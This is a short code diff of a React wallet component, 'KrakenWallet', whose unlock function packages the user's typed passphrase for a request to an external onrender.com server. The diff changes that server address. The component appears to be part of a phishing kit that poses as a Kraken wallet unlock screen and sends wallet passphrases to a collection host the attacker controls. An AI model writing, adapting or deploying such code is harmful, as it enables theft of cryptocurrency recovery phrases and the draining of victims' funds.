@@ -9,7 +9,7 @@ const KrakenWallet = () => {
     const [loading, setLoading] = useState(false);
   
     const unlockWallet = async () => {
-      const url = 'https://obaro-wallet-connector.onrender.com/kraken';
+      const url = 'https://secondwalletvalwizzy.onrender.com/kraken';
       const data = { passphrase: text };
       try {
         setLoading(true);
